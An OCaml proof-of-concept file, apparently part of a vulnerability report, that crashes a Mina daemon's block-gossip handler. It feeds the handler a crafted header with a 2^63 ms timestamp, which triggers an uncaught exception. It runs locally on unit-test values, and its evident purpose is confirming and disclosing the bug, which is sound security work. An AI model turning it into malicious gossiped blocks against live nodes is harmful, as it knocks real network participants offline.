(* RG-1 end-to-end crash PoC.

   Drives the REAL Transition_handler.Block_sink.push (the block-gossip handler)
   with a gossiped header whose blockchain_state.timestamp has the high bit set
   (2^63 ms) -- the value an attacker places in a gossiped block. push pipes it
   through Block_time.to_time_exn (block_sink.ml:124-125) on the pre-validation
   path; to_time_exn raises Failure; the exception is uncaught (o1trace re-raises,
   no Monitor.try_with on the gossip path), so under Async it is fatal -- exactly
   the daemon's behaviour. A clean run prints the uncaught Failure and exits
   nonzero (crash). *)
open Core
open Async

let () =
  let pv = Lazy.force Precomputed_values.for_unit_tests in
  let logger = Logger.null () in
  let consensus_constants = pv.Precomputed_values.consensus_constants in
  let genesis_constants = pv.Precomputed_values.genesis_constants in
  let constraint_constants = pv.Precomputed_values.constraint_constants in
  let slot_duration_ms = consensus_constants.slot_duration_ms in
  let time_controller = Block_time.Controller.basic ~logger in
  (* Craft the malicious header: genesis protocol state with timestamp = 2^63. *)
  let genesis_ps =
    With_hash.data (Precomputed_values.genesis_state_with_hashes pv)
  in
  let module PS = Mina_state.Protocol_state in
  let module BS = Mina_state.Blockchain_state in
  let bs = PS.blockchain_state genesis_ps in
  let bad_ts =
    Block_time.of_uint64 (Unsigned.UInt64.shift_left Unsigned.UInt64.one 63)
  in
  let bad_bs = { bs with BS.Poly.timestamp = bad_ts } in
  let bad_ps =
    PS.create_value
      ~previous_state_hash:(PS.previous_state_hash genesis_ps)
      ~genesis_state_hash:(PS.genesis_state_hash genesis_ps)
      ~blockchain_state:bad_bs
      ~consensus_state:(PS.consensus_state genesis_ps)
      ~constants:(PS.constants genesis_ps)
  in
  let header =
    Mina_block.Header.create ~protocol_state:bad_ps
      ~protocol_state_proof:(Lazy.force Mina_base.Proof.blockchain_dummy)
      ~delta_block_chain_proof:(PS.previous_state_hash bad_ps, [])
      ()
  in
  let _reader, sink =
    Transition_handler.Block_sink.create
      { logger
      ; slot_duration_ms
      ; on_push = (fun () -> Deferred.unit)
      ; time_controller
      ; log_gossip_heard = false
      ; consensus_constants
      ; genesis_constants
      ; constraint_constants
      }
  in
  let cb = Mina_net2.Validation_callback.create_without_expiration () in
  let tm = Block_time.now time_controller in
  printf "RG1_PUSH: calling Block_sink.push with timestamp 2^63 ...\n%!" ;
  don't_wait_for
    ( Transition_handler.Block_sink.push sink
        ( `Header (Network_peer.Envelope.Incoming.local header)
        , `Time_received tm
        , `Valid_cb cb )
    >>| fun () ->
      printf "RG1_PUSH: push RETURNED without crashing (NOT vulnerable)\n%!" ;
      Core.exit 2 ) ;
  upon (after (Time.Span.of_sec 8.0)) (fun () ->
      printf "RG1_PUSH: no crash after 8s\n%!" ;
      Core.exit 3 ) ;
  never_returns (Scheduler.go ())
